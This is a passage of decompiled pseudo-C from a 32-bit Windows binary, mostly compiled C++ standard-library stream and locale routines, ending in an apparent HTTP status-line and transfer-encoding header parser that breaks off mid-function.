  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46B22A: using guessed type __int64 __cdecl _Stoullx(_DWORD, _DWORD, size_t MaxCount, _DWORD);
// 42EA60: using guessed type char var_3C[4];

//----- (0042EB90) --------------------------------------------------------
_DWORD *__thiscall sub_42EB90(char *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, bool *a9)
{
  int v9; // ebx
  _DWORD *v10; // esi
  bool *v11; // edi
  bool v12; // zf
  int v13; // eax
  struct std::_Facet_base *v14; // ebx
  void (__thiscall ***v15)(_DWORD, int); // eax
  int v16; // eax
  int *v17; // eax
  void *v18; // ecx
  int *v19; // eax
  void *v20; // ecx
  void **v21; // eax
  char *v22; // ebx
  int v23; // eax
  char *v24; // eax
  int v25; // eax
  int v26; // ebx
  void (__thiscall ***v27)(_DWORD, int); // eax
  unsigned int v28; // ecx
  _DWORD *result; // eax
  char v30[4]; // [esp+14h] [ebp-6Ch] BYREF
  int *v31; // [esp+18h] [ebp-68h] BYREF
  char *v32; // [esp+1Ch] [ebp-64h] BYREF
  void *v33[5]; // [esp+20h] [ebp-60h] BYREF
  unsigned int v34; // [esp+34h] [ebp-4Ch]
  int v35[4]; // [esp+38h] [ebp-48h] BYREF
  size_t v36; // [esp+48h] [ebp-38h]
  unsigned int v37; // [esp+4Ch] [ebp-34h]
  char v38[32]; // [esp+50h] [ebp-30h] BYREF
  int v39; // [esp+7Ch] [ebp-4h]

  v32 = this;
  v9 = a7;
  v10 = a8;
  v11 = a9;
  v12 = (*(_DWORD *)(a7 + 20) & 0x4000) == 0;
  v31 = *(int **)(*(_DWORD *)(a7 + 48) + 4);
  v13 = *v31;
  if ( v12 )
  {
    (*(void (**)(void))(v13 + 4))();
    v39 = 4;
    v25 = sub_42D2C0((int)v32, v38, &a3, (int)&a5, *(_DWORD *)(v9 + 20), (int)v30);
    v39 = -1;
    v26 = v25;
    if ( v31 )
    {
      v27 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int *))(*v31 + 8))(v31);
      if ( v27 )
        (**v27)(v27, 1);
    }
    if ( v38[0] )
    {
      v28 = _Stolx(v38, &v32, v26, &v31);
      if ( v32 == v38 || v31 )
      {
        *v11 = 1;
      }
      else
      {
        *v11 = v28 != 0;
        if ( v28 < 2 )
          goto LABEL_39;
      }
    }
    else
    {
      *v11 = 0;
    }
    *v10 = 2;
  }
  else
  {
    (*(void (**)(void))(v13 + 4))();
    v39 = 0;
    v14 = sub_42A3A0((int)v30);
    if ( v31 )
    {
      v15 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int *))(*v31 + 8))(v31);
      if ( v15 )
        (**v15)(v15, 1);
    }
    v34 = 15;
    v33[4] = (void *)1;
    LOWORD(v33[0]) = 0;
    v16 = *(_DWORD *)v14;
    v39 = 1;
    (*(void (__thiscall **)(struct std::_Facet_base *, int *))(v16 + 24))(v14, v35);
    v17 = v35;
    if ( v37 >= 0x10 )
      v17 = (int *)v35[0];
    LOBYTE(v39) = 2;
    sub_41F120((char *)v33, v17, v36);
    LOBYTE(v39) = 1;
    if ( v37 >= 0x10 )
    {
      v18 = (void *)v35[0];
      if ( v37 + 1 >= 0x1000 )
      {
        v18 = *(void **)(v35[0] - 4);
        if ( (unsigned int)(v35[0] - (_DWORD)v18 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v18);
    }
    sub_41ED20(v33, 0);
    (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v14 + 28))(v14, v35);
    v19 = v35;
    if ( v37 >= 0x10 )
      v19 = (int *)v35[0];
    LOBYTE(v39) = 3;
    sub_41F120((char *)v33, v19, v36);
    LOBYTE(v39) = 1;
    if ( v37 >= 0x10 )
    {
      v20 = (void *)v35[0];
      if ( v37 + 1 >= 0x1000 )
      {
        v20 = *(void **)(v35[0] - 4);
        if ( (unsigned int)(v35[0] - (_DWORD)v20 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v20);
    }
    v21 = v33;
    v22 = (char *)v33[0];
    if ( v34 >= 0x10 )
      v21 = (void **)v33[0];
    v23 = sub_429590((int)&a3, &a5, 2u, v21);
    if ( v23 )
    {
      if ( v23 == 1 )
      {
        *v11 = 1;
      }
      else
      {
        *v11 = 0;
        *v10 = 2;
      }
    }
    else
    {
      *v11 = 0;
    }
    v39 = -1;
    if ( v34 >= 0x10 )
    {
      v24 = v22;
      if ( v34 + 1 >= 0x1000 )
      {
        v22 = (char *)*((_DWORD *)v22 - 1);
        if ( (unsigned int)(v24 - v22 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v22);
    }
  }
LABEL_39:
  if ( sub_429020((int)&a3, (int)&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46AF44: using guessed type _DWORD __cdecl _Stolx(_DWORD, _DWORD, _DWORD, _DWORD);
// 42EB90: using guessed type char var_6C[4];

//----- (0042EE70) --------------------------------------------------------
int __thiscall sub_42EE70(_DWORD *this, int a2)
{
  void *v2; // edx

  v2 = (void *)this[2];
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  sub_41EF80((void **)a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (0042EF90) --------------------------------------------------------
_DWORD *__thiscall sub_42EF90(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double a7)
{
  unsigned int v7; // edx
  unsigned int v8; // edi
  int v9; // ecx
  int v10; // eax
  int v11; // esi
  int v12; // esi
  int v13; // ecx
  int *v14; // eax
  char *v15; // edi
  size_t v16; // esi
  char *v17; // eax
  int v18; // eax
  char *v19; // ecx
  _DWORD *v20; // esi
  void *v21; // ecx
  int X; // [esp+0h] [ebp-60h]
  int Y; // [esp+1Ch] [ebp-44h] BYREF
  _DWORD *v25; // [esp+20h] [ebp-40h]
  int v26; // [esp+24h] [ebp-3Ch]
  __int64 *v27; // [esp+28h] [ebp-38h]
  int v28; // [esp+2Ch] [ebp-34h]
  int v29[4]; // [esp+30h] [ebp-30h] BYREF
  unsigned int v30; // [esp+40h] [ebp-20h]
  unsigned int v31; // [esp+44h] [ebp-1Ch]
  char v32[8]; // [esp+48h] [ebp-18h] BYREF
  int v33; // [esp+5Ch] [ebp-4h]

  v26 = (int)this;
  v7 = 0;
  v8 = 15;
  v25 = a2;
  v27 = (__int64 *)a5;
  v30 = 0;
  v31 = 15;
  LOBYTE(v29[0]) = 0;
  v9 = *(_DWORD *)(a5 + 24);
  v10 = *(_DWORD *)(a5 + 20) & 0x3000;
  v11 = *(_DWORD *)(a5 + 28);
  v33 = 0;
  v28 = v9;
  if ( __SPAIR64__(v11, v9) <= 0 && v10 != 0x2000 )
  {
    v9 = 6;
    v11 = 0;
    v28 = 6;
  }
  Y = v11;
  v12 = v9;
  if ( v10 == 0x2000 && fabs(a7) > 1.0e10 )
  {
    frexp(a7, &Y);
    v8 = v31;
    v7 = v30;
    v12 += (int)(30103 * abs32(Y)) / 100000;
  }
  v13 = v12 + 50;
  if ( v12 + 50 > v7 )
  {
    sub_41F0C0((char *)v29, v13 - v7, 0);
  }
  else
  {
    v30 = v12 + 50;
    v14 = v29;
    if ( v8 >= 0x10 )
      v14 = (int *)v29[0];
    *((_BYTE *)v14 + v13) = 0;
  }
  v15 = (char *)v29;
  if ( v31 >= 0x10 )
    v15 = (char *)v29[0];
  v16 = v30;
  X = v28;
  v17 = sub_42B180(v26, v32, 0, *((_DWORD *)v27 + 5));
  v18 = sub_401650(v15, v16, v17, X, a7);
  v19 = (char *)v29;
  v20 = v25;
  if ( v31 >= 0x10 )
    v19 = (char *)v29[0];
  sub_42B240(v26, v25, a3, a4, v27, a6, v19, v18);
  if ( v31 >= 0x10 )
  {
    v21 = (void *)v29[0];
    if ( v31 + 1 >= 0x1000 )
    {
      v21 = *(void **)(v29[0] - 4);
      if ( (unsigned int)(v29[0] - (_DWORD)v21 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v21);
  }
  return v20;
}
// 42EF90: using guessed type char var_18[8];

//----- (0042F150) --------------------------------------------------------
_DWORD *__thiscall sub_42F150(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double a7)
{
  unsigned int v7; // edx
  unsigned int v8; // edi
  int v9; // ecx
  int v10; // eax
  int v11; // esi
  int v12; // esi
  int v13; // ecx
  int *v14; // eax
  char *v15; // edi
  size_t v16; // esi
  char *v17; // eax
  int v18; // eax
  char *v19; // ecx
  _DWORD *v20; // esi
  void *v21; // ecx
  int X; // [esp+0h] [ebp-60h]
  int Y; // [esp+1Ch] [ebp-44h] BYREF
  _DWORD *v25; // [esp+20h] [ebp-40h]
  int v26; // [esp+24h] [ebp-3Ch]
  __int64 *v27; // [esp+28h] [ebp-38h]
  int v28; // [esp+2Ch] [ebp-34h]
  int v29[4]; // [esp+30h] [ebp-30h] BYREF
  unsigned int v30; // [esp+40h] [ebp-20h]
  unsigned int v31; // [esp+44h] [ebp-1Ch]
  char v32[8]; // [esp+48h] [ebp-18h] BYREF
  int v33; // [esp+5Ch] [ebp-4h]

  v26 = (int)this;
  v7 = 0;
  v8 = 15;
  v25 = a2;
  v27 = (__int64 *)a5;
  v30 = 0;
  v31 = 15;
  LOBYTE(v29[0]) = 0;
  v9 = *(_DWORD *)(a5 + 24);
  v10 = *(_DWORD *)(a5 + 20) & 0x3000;
  v11 = *(_DWORD *)(a5 + 28);
  v33 = 0;
  v28 = v9;
  if ( __SPAIR64__(v11, v9) <= 0 && v10 != 0x2000 )
  {
    v9 = 6;
    v11 = 0;
    v28 = 6;
  }
  Y = v11;
  v12 = v9;
  if ( v10 == 0x2000 && fabs(a7) > 1.0e10 )
  {
    frexp(a7, &Y);
    v8 = v31;
    v7 = v30;
    v12 += (int)(30103 * abs32(Y)) / 100000;
  }
  v13 = v12 + 50;
  if ( v12 + 50 > v7 )
  {
    sub_41F0C0((char *)v29, v13 - v7, 0);
  }
  else
  {
    v30 = v12 + 50;
    v14 = v29;
    if ( v8 >= 0x10 )
      v14 = (int *)v29[0];
    *((_BYTE *)v14 + v13) = 0;
  }
  v15 = (char *)v29;
  if ( v31 >= 0x10 )
    v15 = (char *)v29[0];
  v16 = v30;
  X = v28;
  v17 = sub_42B180(v26, v32, 76, *((_DWORD *)v27 + 5));
  v18 = sub_401650(v15, v16, v17, X, a7);
  v19 = (char *)v29;
  v20 = v25;
  if ( v31 >= 0x10 )
    v19 = (char *)v29[0];
  sub_42B240(v26, v25, a3, a4, v27, a6, v19, v18);
  if ( v31 >= 0x10 )
  {
    v21 = (void *)v29[0];
    if ( v31 + 1 >= 0x1000 )
    {
      v21 = *(void **)(v29[0] - 4);
      if ( (unsigned int)(v29[0] - (_DWORD)v21 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v21);
  }
  return v20;
}
// 42F150: using guessed type char var_18[8];

//----- (0042F310) --------------------------------------------------------
_DWORD *__thiscall sub_42F310(
        void *this,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        __int64 *a5,
        unsigned __int8 a6,
        const void *a7)
{
  int v8; // eax
  char v10[64]; // [esp+Ch] [ebp-44h] BYREF

  v8 = sub_401650(v10, 0x40u, "%p", a7);
  sub_42D860((int)this, a2, a3, a4, a5, a6, v10, v8);
  return a2;
}

//----- (0042F450) --------------------------------------------------------
_DWORD *__thiscall sub_42F450(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, char a6, unsigned __int8 a7)
{
  bool v7; // zf
  struct std::_Facet_base *v9; // esi
  void (__thiscall ***v10)(_DWORD, int); // eax
  int v11; // eax
  unsigned int v12; // esi
  int v13; // esi
  int *v14; // eax
  int v15; // ecx
  _DWORD *v16; // edx
  unsigned __int8 *v17; // eax
  char *v18; // ebx
  int *v19; // eax
  char *v20; // eax
  int v21; // [esp-30h] [ebp-94h]
  int v22; // [esp-28h] [ebp-8Ch]
  unsigned __int8 v23; // [esp-20h] [ebp-84h]
  int v24; // [esp+14h] [ebp-50h] BYREF
  int v25; // [esp+18h] [ebp-4Ch]
  int v26; // [esp+1Ch] [ebp-48h]
  int v27; // [esp+20h] [ebp-44h]
  _QWORD v28[3]; // [esp+24h] [ebp-40h] BYREF
  int v29[4]; // [esp+3Ch] [ebp-28h] BYREF
  unsigned int v30; // [esp+4Ch] [ebp-18h]
  unsigned int v31; // [esp+50h] [ebp-14h]
  int v32; // [esp+60h] [ebp-4h]
  _DWORD *v33; // [esp+74h] [ebp+10h]

  v26 = (int)this;
  v7 = (*((_DWORD *)a5 + 5) & 0x4000) == 0;
  LOBYTE(v27) = a6;
  if ( v7 )
  {
    (*(void (__thiscall **)(void *, _DWORD *, int, _DWORD *, __int64 *, int, _DWORD))(*(_DWORD *)this + 36))(
      this,
      a2,
      a3,
      a4,
      a5,
      v27,
      a7);
    return a2;
  }
  else
  {
    v25 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
    (*(void (**)(void))(*(_DWORD *)v25 + 4))();
    v32 = 0;
    v9 = sub_42A3A0((int)&v24);
    if ( v25 )
    {
      v10 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v25 + 8))(v25);
      if ( v10 )
        (**v10)(v10, 1);
    }
    v30 = 0;
    v31 = 15;
    LOBYTE(v29[0]) = 0;
    v11 = *(_DWORD *)v9;
    v32 = 1;
    if ( a7 )
      (*(void (__thiscall **)(struct std::_Facet_base *, _QWORD *))(v11 + 28))(v9, v28);
    else
      (*(void (__thiscall **)(struct std::_Facet_base *, _QWORD *))(v11 + 24))(v9, v28);
    sub_419A60(v29, v28);
    sub_4199E0(v28);
    v12 = *((_DWORD *)a5 + 8);
    if ( a5[4] <= 0 || v12 <= v30 )
      v13 = 0;
    else
      v13 = v12 - v30;
    if ( (*((_DWORD *)a5 + 5) & 0x1C0) == 64 )
    {
      v16 = a4;
      v15 = a3;
    }
    else
    {
      v14 = sub_42DDE0(v26, &v24, a3, a4, v27, v13);
      v13 = 0;
      v15 = *v14;
      v16 = (_DWORD *)v14[1];
    }
    v17 = (unsigned __int8 *)v29;
    v18 = (char *)v29[0];
    if ( v31 >= 0x10 )
      v17 = (unsigned __int8 *)v29[0];
    v19 = sub_42DD60(v26, &v24, v15, v16, v17, v30);
    v23 = v27;
    v22 = *v19;
    v21 = v26;
    v33 = (_DWORD *)v19[1];
    *((_DWORD *)a5 + 8) = 0;
    *((_DWORD *)a5 + 9) = 0;
    sub_42DDE0(v21, a2, v22, v33, v23, v13);
    if ( v31 >= 0x10 )
    {
      v20 = v18;
      if ( v31 + 1 >= 0x1000 )
      {
        v18 = (char *)*((_DWORD *)v18 - 1);
        if ( (unsigned int)(v20 - v18 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v18);
    }
    return a2;
  }
}
// 42F450: using guessed type _QWORD var_40[3];

//----- (0042F630) --------------------------------------------------------
char __thiscall sub_42F630(_BYTE *this)
{
  return this[13];
}

//----- (0042F640) --------------------------------------------------------
int __thiscall sub_42F640(_DWORD *this, int a2)
{
  void *v2; // edx

  v2 = (void *)this[5];
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  sub_41EF80((void **)a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (0042F680) --------------------------------------------------------
char *__thiscall sub_42F680(char *this)
{
  return this + 20;
}

//----- (0042F690) --------------------------------------------------------
bool __thiscall sub_42F690(int *this, _DWORD *a2)
{
  int *v3; // ebx
  int *v4; // eax
  int v5; // edi
  int *v6; // esi
  int v7; // edx
  int v8; // ecx
  bool v9; // bl
  _BYTE *v10; // ecx
  unsigned int v11; // edx
  __int128 v13; // [esp-18h] [ebp-48h] BYREF
  __int64 v14; // [esp-8h] [ebp-38h]
  int *v15; // [esp+10h] [ebp-20h]
  _BYTE *v16; // [esp+14h] [ebp-1Ch] BYREF
  unsigned int v17; // [esp+28h] [ebp-8h]

  v15 = (int *)*this;
  sub_419BE0(&v13, a2);
  v3 = (int *)sub_432070((int)&v16, v13, v14);
  v4 = sub_429F50(this, v3);
  v5 = *this;
  v6 = v4;
  if ( v4 == (int *)v5 )
    goto LABEL_7;
  v7 = (int)(v4 + 4);
  if ( (unsigned int)v4[9] >= 0x10 )
    v7 = v4[4];
  v8 = (int)v3;
  if ( (unsigned int)v3[5] >= 0x10 )
    v8 = *v3;
  if ( sub_429FB0(v8, v3[4], v7, v4[8]) < 0 )
LABEL_7:
    v6 = (int *)v5;
  v9 = v6 != v15;
  if ( v17 >= 0x10 )
  {
    v10 = v16;
    v11 = v17 + 1;
    if ( v17 + 1 >= 0x1000 )
    {
      v10 = (_BYTE *)*((_DWORD *)v16 - 1);
      v11 = v17 + 36;
      if ( (unsigned int)(v16 - v10 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v14) = v11;
    sub_46C87D(v10);
  }
  return v9;
}

//----- (0042F760) --------------------------------------------------------
int __thiscall sub_42F760(int this, __int64 a2, int a3)
{
  char v4; // di
  int *v5; // ebx
  int v6; // eax
  int v7; // ecx
  int v8; // ebx
  unsigned int v9; // edi
  _DWORD *v10; // ecx
  int *v11; // edx
  _DWORD *v12; // ecx
  unsigned __int8 *v13; // edx
  int v14; // eax
  int v15; // edx
  int v16; // eax
  _DWORD *v17; // edx
  char v18; // al
  char v19; // cl
  int v20; // eax
  int v21; // ecx
  int v22; // eax
  int v23; // eax
  int v24; // ecx
  char *v26; // esi
  int *v27; // eax
  int v28; // [esp+0h] [ebp-44h] BYREF
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-34h] BYREF
  int *v30; // [esp+24h] [ebp-20h]
  char v31; // [esp+28h] [ebp-1Ch]
  int v32; // [esp+2Ch] [ebp-18h]
  int v33; // [esp+30h] [ebp-14h]
  int *v34; // [esp+34h] [ebp-10h]
  int v35; // [esp+40h] [ebp-4h]

  v34 = &v28;
  v33 = this;
  v4 = 0;
  v5 = (int *)this;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  v6 = *(_DWORD *)this;
  v32 = 0;
  v30 = (int *)this;
  v7 = *(_DWORD *)(*(_DWORD *)(v6 + 4) + this + 56);
  if ( v7 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v7);
  v35 = 0;
  v31 = sub_427AC0((_BYTE *)this, 1);
  v35 = 1;
  if ( v31 )
  {
    v8 = HIDWORD(a2);
    if ( a2 >= 0 )
    {
      v9 = a2;
      if ( a2 <= 0 )
      {
        v4 = 0;
      }
      else
      {
        LOBYTE(v35) = 2;
        do
        {
          if ( v9 != -1 || v8 != 0x7FFFFFFF )
          {
            v8 = (__PAIR64__(v8, v9--) - 1) >> 32;
            if ( v8 < 0 )
              break;
          }
          v10 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)this + 4) + this + 56);
          if ( *(_DWORD *)v10[7] && (v11 = (int *)v10[11], *v11 > 0) )
          {
            --*v11;
            v12 = (_DWORD *)v10[7];
            v13 = (unsigned __int8 *)(*v12)++;
            v14 = *v13;
          }
          else
          {
            v14 = (*(int (__thiscall **)(_DWORD *))(*v10 + 28))(v10);
          }
          if ( v14 == -1 )
          {
            v4 = 1;
            v35 = 1;
            goto LABEL_19;
          }
          ++*(_QWORD *)(this + 8);
        }
        while ( v14 != a3 );
        v4 = 0;
        v35 = 1;
      }
    }
LABEL_19:
    v5 = v30;
  }
  v15 = *(_DWORD *)(*(_DWORD *)this + 4);
  v16 = *(_DWORD *)(v15 + this + 12);
  v17 = (_DWORD *)(this + v15);
  v18 = v4 | v16;
  v19 = v18 | 4;
  if ( v17[14] )
    v19 = v18;
  v20 = v17[4];
  v21 = v19 & 0x17;
  v17[3] = v21;
  v22 = v21 & v20;
  if ( v22 )
  {
    if ( (v22 & 4) != 0 )
    {
      v26 = "ios_base::badbit set";
    }
    else
    {
      v26 = "ios_base::failbit set";
      if ( (v22 & 2) == 0 )
        v26 = "ios_base::eofbit set";
    }
    v27 = sub_402C50(&a2, 1);
    sub_403590(pExceptionObject, v26, v27);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v23 = *v5;
  v35 = 4;
  v24 = *(int *)((char *)v5 + *(_DWORD *)(v23 + 4) + 56);
  if ( v24 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v24 + 8))(v24);
  return this;
}
// 42F760: using guessed type _DWORD pExceptionObject[5];

//----- (0042F930) --------------------------------------------------------
int __thiscall sub_42F930(int this, int a2)
{
  int result; // eax
  unsigned int v4; // ebx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // edx
  _BYTE *v8; // esi
  size_t v9; // ebx
  size_t v10; // esi
  _DWORD *v11; // eax
  char *v12; // ecx
  int v13; // edx
  int v14; // eax
  _DWORD *v15; // ecx
  _BYTE *v16; // edx
  void *Src; // [esp+Ch] [ebp-8h]
  _DWORD *v18; // [esp+10h] [ebp-4h]

  if ( (*(_BYTE *)(this + 60) & 2) != 0 )
    return -1;
  if ( a2 == -1 )
    return 0;
  v4 = **(_DWORD **)(this + 32);
  v5 = *(_DWORD **)(this + 48);
  v6 = *v5 + v4;
  if ( v4 && v4 < v6 )
  {
    --*v5;
    v7 = *(_DWORD **)(this + 32);
    result = a2;
    v8 = (_BYTE *)(*v7)++;
    *v8 = a2;
    *(_DWORD *)(this + 56) = v4 + 1;
    return result;
  }
  Src = **(void ***)(this + 12);
  v9 = v4 != 0 ? v6 - (_DWORD)Src : 0;
  if ( v9 >= 0x20 )
  {
    if ( v9 < 0x3FFFFFFF )
    {
      v10 = 2 * v9;
      goto LABEL_13;
    }
    if ( v9 < 0x7FFFFFFF )
    {
      v10 = 0x7FFFFFFF;
      goto LABEL_13;
    }
    return -1;
  }
  v10 = 32;
LABEL_13:
  v18 = sub_41FC00(v10);
  memmove(v18, Src, v9);
  v11 = *(_DWORD **)(this + 16);
  *(_DWORD *)(this + 56) = (char *)v18 + v9 + 1;
  *v11 = v18;
  **(_DWORD **)(this + 32) = (char *)v18 + v9;
  **(_DWORD **)(this + 48) = v10 - v9;
  if ( (*(_BYTE *)(this + 60) & 4) != 0 )
  {
    **(_DWORD **)(this + 12) = v18;
    **(_DWORD **)(this + 28) = 0;
    **(_DWORD **)(this + 44) = v18;
  }
  else
  {
    v12 = (char *)v18 + **(_DWORD **)(this + 28) - (_DWORD)Src;
    v13 = *(_DWORD *)(this + 56) - (_DWORD)v12;
    **(_DWORD **)(this + 12) = v18;
    **(_DWORD **)(this + 28) = v12;
    **(_DWORD **)(this + 44) = v13;
  }
  v14 = *(_DWORD *)(this + 60);
  if ( (v14 & 1) != 0 )
  {
    sub_41FC60(Src, v9);
    v14 = *(_DWORD *)(this + 60);
  }
  *(_DWORD *)(this + 60) = v14 | 1;
  --**(_DWORD **)(this + 48);
  v15 = *(_DWORD **)(this + 32);
  v16 = (_BYTE *)(*v15)++;
  result = a2;
  *v16 = a2;
  return result;
}

//----- (0042FA90) --------------------------------------------------------
void __thiscall sub_42FA90(int this, _DWORD *a2)
{
  _BYTE *v3; // eax
  int v4; // edx
  int *v5; // eax
  int v6; // esi
  _DWORD *v7; // eax
  unsigned int v8; // ebx
  int *v9; // eax
  int *v10; // eax
  char v11; // bl
  int *v12; // eax
  bool v13; // cf
  int *v14; // eax
  _BYTE *v15; // eax
  int *v16; // ebx
  int *v17; // esi
  int v18; // eax
  int v19; // edx
  int v20; // ecx
  bool v21; // zf
  void *v22; // ecx
  unsigned int v23; // edx
  int *v24; // esi
  _DWORD *v25; // eax
  char v26; // bl
  unsigned int v27; // edx
  _DWORD **v28; // ecx
  _DWORD **v29; // esi
  unsigned __int8 *v30; // ecx
  int v31; // eax
  int *v32; // ecx
  unsigned __int8 **v33; // ecx
  unsigned __int8 *v34; // edx
  int v35; // eax
  _BYTE *v36; // eax
  int v37; // eax
  _DWORD **v38; // esi
  unsigned __int8 *v39; // ecx
  int v40; // ebx
  int *v41; // esi
  unsigned int v42; // edi
  int *v43; // eax
  int *v44; // ecx
  _DWORD *v45; // ecx
  unsigned __int8 *v46; // edx
  int v47; // eax
  unsigned int v48; // ecx
  _DWORD *v49; // eax
  void *v50; // esi
  int v51; // eax
  unsigned int v52; // ecx
  int v53; // eax
  void *v54; // edx
  unsigned int v55; // ecx
  _BYTE v56[28]; // [esp-1Ch] [ebp-174h] BYREF
  int v57[42]; // [esp+10h] [ebp-148h] BYREF
  int v58; // [esp+B8h] [ebp-A0h]
  _DWORD *v59; // [esp+BCh] [ebp-9Ch]
  unsigned int v60; // [esp+C0h] [ebp-98h]
  unsigned int v61; // [esp+C8h] [ebp-90h] BYREF
  int *v62; // [esp+CCh] [ebp-8Ch]
  _DWORD **v63; // [esp+D0h] [ebp-88h] BYREF
  unsigned int v64; // [esp+D4h] [ebp-84h]
  _DWORD **v65; // [esp+D8h] [ebp-80h] BYREF
  unsigned int v66; // [esp+DCh] [ebp-7Ch]
  int v67; // [esp+E4h] [ebp-74h] BYREF
  _DWORD v68[6]; // [esp+E8h] [ebp-70h] BYREF
  int v69[5]; // [esp+100h] [ebp-58h] BYREF
  unsigned int v70; // [esp+114h] [ebp-44h]
  void *v71[6]; // [esp+118h] [ebp-40h] BYREF
  int v72[4]; // [esp+130h] [ebp-28h] BYREF
  unsigned int v73; // [esp+140h] [ebp-18h]
  unsigned int v74; // [esp+144h] [ebp-14h]
  int v75; // [esp+154h] [ebp-4h]

  v62 = (int *)this;
  v67 = 0;
  sub_42A4C0(v57, a2, 1, 1u);
  v75 = 1;
  v73 = 0;
  v74 = 15;
  LOBYTE(v72[0]) = 0;
  v3 = sub_426290(v57, (int)v72);
  if ( (v3[*(_DWORD *)(*(_DWORD *)v3 + 4) + 12] & 6) != 0 )
    goto LABEL_24;
  if ( v73 < 8 )
    goto LABEL_14;
  v5 = v72;
  v6 = v72[0];
  if ( v74 >= 0x10 )
    v5 = (int *)v72[0];
  if ( *((_BYTE *)v5 + 6) != 46 )
    goto LABEL_15;
  *(_DWORD *)&v56[24] = "http/";
  sub_419610(v72, (int)v56, 0, 5u);
  v7 = (_DWORD *)sub_432070((int)v71, *(__int128 *)v56, *(__int64 *)&v56[16]);
  v67 = 1;
  if ( !sub_4232C0(v7, *(const char **)&v56[24]) )
  {
LABEL_14:
    v6 = v72[0];
LABEL_15:
    v11 = 0;
    goto LABEL_16;
  }
  v8 = v74;
  v9 = v72;
  v6 = v72[0];
  if ( v74 >= 0x10 )
    v9 = (int *)v72[0];
  if ( !isdigit(*((char *)v9 + 5)) )
    goto LABEL_15;
  v10 = v72;
  if ( v8 >= 0x10 )
    v10 = (int *)v6;
  if ( !isdigit(*((char *)v10 + 7)) )
    goto LABEL_15;
  v11 = 1;
LABEL_16:
  if ( (v67 & 1) != 0 )
    sub_4199E0(v71);
  if ( !v11 )
    goto LABEL_104;
  v12 = v72;
  if ( v74 >= 0x10 )
    v12 = (int *)v6;
  v13 = v74 < 0x10;
  *(_DWORD *)(this + 12) = *((char *)v12 + 5) - 48;
  v14 = v72;
  if ( !v13 )
    v14 = (int *)v6;
  *(_DWORD *)(this + 16) = *((char *)v14 + 7) - 48;
LABEL_24:
  v67 = v61;
  sub_429270(v57, v4, (int)&v67);
  if ( (*((_BYTE *)&v57[3] + *(_DWORD *)(v57[0] + 4)) & 6) != 0 )
  {
LABEL_104:
    *(_DWORD *)(this + 8) = 1000;
    goto LABEL_105;
  }
  *(_DWORD *)&v56[24] = 10;
  *(_QWORD *)&v56[16] = 0x7FFFFFFFFFFFFFFFi64;
  *(_DWORD *)(this + 8) = v67;
  sub_42F760((int)v57, *(__int64 *)&v56[16], *(int *)&v56[24]);
  sub_430250((int *)this, (int)v57);
  v13 = *(_DWORD *)(this + 40) < 0x10u;
  v15 = (_BYTE *)(this + 20);
  *(_DWORD *)(this + 36) = 0;
  if ( !v13 )
    v15 = *(_BYTE **)(this + 20);
  *(_DWORD *)&v56[24] = 17;
  *(_DWORD *)&v56[20] = "transfer-encoding";
  *v15 = 0;
  v71[4] = 0;
  v71[5] = (void *)15;
  LOBYTE(v71[0]) = 0;
  sub_41EF80(v71, *(void **)&v56[20], *(size_t *)&v56[24]);
  LOBYTE(v75) = 2;
  sub_419BE0(&v56[4], v71);
  v16 = (int *)sub_432070((int)v69, *(__int128 *)&v56[4], *(__int64 *)&v56[20]);
  v17 = sub_429F50(v62, v16);
  v18 = *v62;
  v67 = v18;
  if ( v17 == (int *)v18 )
    goto LABEL_33;
  v19 = (int)(v17 + 4);
  if ( (unsigned int)v17[9] >= 0x10 )
    v19 = v17[4];
  v20 = (int)v16;
  if ( (unsigned int)v16[5] >= 0x10 )
    v20 = *v16;
  v21 = sub_429FB0(v20, v16[4], v19, v17[8]) >= 0;
  v18 = v67;
  if ( !v21 )
LABEL_33:
    v17 = (int *)v18;
  if ( v70 >= 0x10 )
  {
    v22 = (void *)v69[0];
    v23 = v70 + 1;
    if ( v70 + 1 >= 0x1000 )
    {
      v22 = *(void **)(v69[0] - 4);
      v23 = v70 + 36;
      if ( (unsigned int)(v69[0] - (_DWORD)v22 - 4) > 0x1F )
LABEL_110:
        _invalid_parameter_noinfo_noreturn();
    }
    *(_DWORD *)&v56[24] = v23;
    sub_46C87D(v22);
    v18 = *v62;
  }
  v69[4] = 0;
  v70 = 15;
  LOBYTE(v69[0]) = 0;
  if ( v17 == (int *)v18 )
  {
